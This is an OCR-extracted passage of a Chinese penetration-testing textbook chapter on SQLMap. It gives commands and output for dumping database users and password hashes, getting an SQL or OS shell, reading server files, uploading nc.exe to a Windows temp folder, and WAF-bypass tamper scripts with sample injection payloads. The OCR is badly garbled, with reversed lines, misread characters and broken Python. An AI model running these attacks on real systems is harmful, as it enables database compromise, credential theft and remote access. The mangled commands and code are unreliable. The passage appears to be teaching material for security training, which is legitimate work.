'root'@127.0.0.1
nt system users [4]:
图3-11列出数据库的用户
8.获取数据库用户的密码
该命令的作用是列出数据库用户的密码，如下所示。如果当前用户有读取包含
用户密码的权限，SQLMap会先列举出用户，然后列出Hash，并尝试破解。
spuomssed-- _I=pTdyduogun/bs /L°T*89t*26t//:d4. n- Ad·dew[bs
从图3-12中可以看到，密码使用MySQL5加密，可以在www.cmd5.com中自行解
密。
图3-12查询数据库的密码
9.获取当前网站数据库的名称
使用该命令可以列出当前网站使用的数据库，如下所示。
sqlmap·py -u http://192.168.1.7/sq1/un.on. php?1d=1* --current -db
从图3-13中可以看到数据库是sql。
back-endDBHS:MySQL>=5.0.12
[28:45:05] [INFo] fetching current database
current database:
'sql'
图3-13列出当前网站的数据库
---
## Page 55
36Web安全政防：渗造测试实战指南
10.获取当前网站数据库的用户名称
使用该命令可以列出当前网站使用的数据库用户，如下所示。
sq1map -py -u http: //192.168 . 1 .7/sq1/un1on.php?1d=1* --current-user
从图3-14中可以看到，用户是root。
[20:51:e1] [INFo] fetching current user
current user:
rootelocalhost'
[20:51:01] [INF0] fetched data logged to
图3-14列出当前数据库的用户
3.1.3SQLMap进阶：参数讲解
1.-level5：探测等级
参数-level5指需要执行的测试等级，一共有5个等级（1~5），可不加level，默认
是1。SQLMap使用的Payload可以在xml/payloads.xml中看到，也可以根据相应的格式
添加自己的Payload，其中5级包含的Payload最多，会自动破解出cookie、XFF等头部
注入。当然，level5的运行速度也比较慢。
这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTPcookie
在level为2时就会测试，HTTPUser-Agent/Referer头在level为3时就会测试。总之，在
不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值。
2.-is-dba：当前用户是否为管理权限
该命令用于查看当前账户是否为数据库管理员账户，如下所示，在本案例中输
入该命令，会返回Ture，如图3-15所示，
sqlmap-py -u http://192.168.1.7/sq1/un1on.php?1d=1* --1s-dba
[o1.38:z8][iNF0]tetch1ngcurrent user
current user is DBA:
True
图3-15查看当前账户是否为数据库管理员账户
---
## Page 56
第3章常用的渗造洲试工具
3.--roles：列出数据库管理员角色
该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的
表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角
色。该命令仅适用于当前数据库是Oracle的时候。在本案例中输入该命令的结果如图
3-16所示
database man
[*]
ntsysten usersroles
role:
ALTER
role:
ALTER ROUTINE
role:
CREATE ROUTINE
CREATE
role:
CREATE TABLESPACE
E
Fole
role:
CREATE
CREATE
VIEW
role:
DELETE
role:
role:
role:
FILE
role:
INSERT
NDEX
rolei
LOCK TABLES
role:
REFERENCES
OCESS
Folei
RELOAD
REPLICATION CLIENT
rolei
role:
REPLICATION SLAVE
SELECT
SHOW VIEW
SHOW DATABASES
role:
role:
role:
role:
TRIGGER
role:UPDATE
图3-16查看数据库用户的角色
4.--referer: HTTP Referer 头
SQLMap可以在请求中伪造HTTP中的referer，当-level参数设定为3或3以上时，
会尝试对referer注入。可以使用referer命令来欺骗，如-refererhttp:/www.baidu.com。
---
## Page 57
38Web安全攻防：渗造测试实战指南
5.--sql-shell：运行自定义SQL语句
该命令用于执行指定的SQL语句，如下所示，假设执行select*from userslimit 0,1
语句，结果如图3-17所示。
sq1map-py -u http://192.168.1.7/sq1/union.php?1d=1" --sq1-she11
图3-17执行指定的SQL语句
6.--os-cmd,--os-shell：运行任意操作系统命令
在数据库为MySQL、PostgreSQL或Microsoft SQLServer，并且当前用户有权限
使用特定的函数时，如果数据库为MySQL、PostgreSQL，SQLMap上传一个二进制库，
包含用户自定义的函数sys_execO和sys_evalO，那么创建的这两个函数就可以执行系
统命令。在Microsoft SQLServer中，SQLMap将使用xp_cmdshell存储过程，如果被禁
用（在MicrosoftSQLServer2005及以上版本默认被禁制），则SQLMap会重新启用它；
如果不存在，会自动创建。
用-Os-shell参数可以模拟一个真实的Shell，输入想执行的命令.当不能执行多语
句时（比如PHP或ASP的后端数据库为MySQL），仍然可以使用INTOOUTFILE写进
可写目录，创建一个Web后门。--OS-shell支持ASP、ASP.NET、JSP和PHP四种语言（要
想执行改参数，需要有数据库管理员权限，也就是--is-dba的值要为True）。
7.--file-read：从数据库服务器中读取文件
该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQL
Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是
二进制文件。下面以Microsoft SQLServer2005为例，复习-file-read参数的用法。
$ python sqlmap-py -u
*http://192.168.136.129/sq1map/nssq1/11s/get_str2.asp?name=1uther* \
-file-read "C:/example.exe" -v 1
---
## Page 58
第3章常用的渗透测试工具
35
[·.·]
[hh:mm:49][INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: windows 20ee
web application technology: ASP.NET, Microsoft IIS 6.e, ASP
back-end DBMS: Microsoft SQL Server 2ee5
xx/. S[0][s:]
[hh:mm:5e][INFo] the SQL query provided returns 3 entries
C:/example.exe file saved to:
‘/software/sqlnap/output/192.168.136.129/f11es/C_examp1e,exe
[...]
$ 1s -1 output/192.168.136.129/f11es/C_example.exe
-rw-r--r-- 1 inquis inquis 2568 2e11-MM-00 hh:mm
output/192.168.136.129/f11es/C_examp1e.exe
$ f11e output/192.168.136.129/f11es/C_example,exe
output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI)
Intel
80386 32-bit
8.--file-write--file-dest：上传文件到数据库服务器中
该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或
MicrosofSQLServer，并且当前用户有权限使用特定的函数时，上传的文件可以是文
本，也可以是二进制文件。下面以一个MySQL的例子复习--file-write--file-dest参数的
用法。
$ file /software/nc.exe.packed
/software/nc.exe,packed: PE32 executable for MS Windows (console) Inte1 8e386 32-bit
β 1s -1 /software/nc.exe-packed
-rwxr-xr-x 1 1nquis 1nqu1s 31744 20e9-MM-DD hh:mm /software/nc.exe.packed
pxse*u48/s/ubs/62*9*99z6/:du n- .debs uod s
"/software/nc.exe.packed" --file-dest "C:/WINDowS/Temp/nc,exe* -v 1
--file-write \
[...]
[hh:mm:29][INFO] the back-end DBMS is MySQL
web server operating systen: windous 2ee3 or 2008
web application technology: ASP.NET, Microsoft IIS 6.e, ASP.NET 2.e.5e727
back-end DBMS: MySQL &gt;= 5.0.0
[-..-]
do you want confirmat:ion that the file *C:/WINDoWS/Temp/nc.exe* has been successfu1ly
written on the back-end DBMS file systen? [Y/n]y
---
## Page 59
0
Web安全政防：渗造测试实战指南
[hh:mm:52] [INF0]  retrieved:  31744
[hh:mm:52] [INF0] the file has been successfu1ly written and its size is 31744 bytes,
sane s1ze as the 1ocal f11e */software/nc.exe.packed*
3.1.4SQLMap自带绕过脚本tamper的讲解
SQLMap在默认情况下除了使用CHARO函数防止出现单引号，没有对注入的数
据进行修改，读者还可以使用-tamper参数对数据做修改来绕过WAF等设备，其中大
部分脚本主要用正则模块替换攻击载荷字符编码的方式尝试绕过WAF的检测规则，
命令如下所示。
du-xxxxddbs
目前官方提供53个绕过脚本，下面是一个tamper脚本的格式。
# sqlnap/tamper/escapequotes .py
from 1ib,core,enums Inport PRIoRITY
_priority_ = PRIORITY,LOWEST
def dependencies():
pass
def tamper(payload, **kwargs):
return payload.replace(***, "\\*") .replace(*"*, *\\**)
不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper
函数定义。
。priority定义脚本的优先级，用于有多个tamper脚本的情况。
。dependencies函数声明该脚本适用/不适用的范围，可以为空。
下面以一个转大写字符绕过的脚本为例，tamper绕过脚本主要由dependencies和
tamper两个函数构成。def tamper（payload,**kwargs）函数接收playload和**kwargs
返回一个Payload。下面这段代码的意思是通过正则匹配所有字符，将所有攻击载荷
中的字符转换为大写字母。
def tamper(payload, **kwargs):
retVal = payload
---
## Page 60
第3章常用的渗透测试工具
L
if payload:
for match in re.finditer(*[A-Za-z_]+", retval):
word = match.group()
if word.upper() in kb.keywords:
retval = retVal.replace(word, word.upper())
return retVa1
在日常使用中，我们会对一些网站是否有安全防护（WAF/IDS/IPS）进行试探，
可以使用参数-identify-waf进行检测。
下面介绍一些常用的tamper脚本。
apostrophemask.py
作用：将引号替换为UTF-8，用于过滤单引号。
使用脚本前的语句为：
1 AND'1′=′1
使用脚本后，语句为：
1AND %EF%BC%871%EF%BC%87=%EF%BC%871
base64encode.py
作用：替换为base64编码。
使用脚本前的语句为：
1′ AND SLEEP(5)#
使用脚本后，语句为：
MS-cgQUSEIFNMRUVQKDUpIw*
multiplespaces.py
作用：围绕SQL关键字添加多个空格。
使用脚本前的语句为：
1 UNION SELECT foobar
使用脚本后，语句为：
1
UNION
SELECT
foobar
space2plus.py
---
## Page 61
Z
Web安全政防：渗透测试实战指南
作用：用+号替换空格。
使用脚本前的语句为：
SELECT id FROM users
使用脚本后，语句为：
SELECT+id+FROM+users
nonrecursivereplacement.py
作用：作为双重查询语句，用双重语句替代预定义的SQL关键字（适用于非常弱
的自定义过滤器，例如将SELECT替换为空）。
使用脚本前的语句为：
1 UNION SELECT 2--
使用脚本后，语句为：
1 UNIOUNIONN SELESELECTCT 2--
space2randomblank.py
作用：将空格替换为其他有效字符。
使用脚本前的语句为：
SELECT 1d FROM users
使用脚本后，语句为：
SELECT%eDid%eDFROM%eAusers
unionalltounion.py
作用：将UNIONALLSELECT替换为UNION SELECT。
使用脚本前的语句为：
-1 UNION ALL SELECT
使用脚本后，语句为：
-1 UNION SELECT
securesphere.py
作用：追加特制的字符串。
---
## Page 62
第3章常用的渗透测试工具
43
使用脚本前的语句为：
1 AND 1=1
使用脚本后，语句为：
1 AND 1=1 and ‘ehaving'=′ehaving′
space2hash.py
作用：将空格替换为#号，并添加一个随机字符串和换行符。
使用脚本前的语句为：
1 AND 9227=9227
使用脚本后，语句为：
1%23nVNaVoPYevateAAND%23ngNvzqu&eA9227=9227
space2mssqlblank.py(mssql)
作用：将空格普换为其他空符号。
使用脚本前的语句为：
SELECT 1d FROM users
使用脚本后，语句为：
SELECT%eE1d%6
space2mssqlhash.py
作用：将空格替换为#号，并添加一个换行符。
使用脚本前的语句为：
1 AND 9227=9227
使用脚本后，语句为：
1%23%8AAND%23%8A9227=9227
between.py
作用：用NOTBETWEEN0AND替换大于号（>），用BETWEENAND替换等号
(=)。
使用脚本前的语句为：
---
## Page 63